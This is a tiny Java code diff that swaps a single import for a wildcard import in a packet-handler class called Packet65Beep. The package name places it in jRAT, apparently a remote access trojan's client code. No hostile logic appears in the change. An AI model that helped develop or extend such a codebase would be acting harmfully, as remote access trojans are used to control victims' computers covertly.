@@ -2,7 +2,7 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 
-import java.awt.Toolkit;
+import java.awt.*;
 
 public class Packet65Beep extends AbstractIncomingPacket {
 
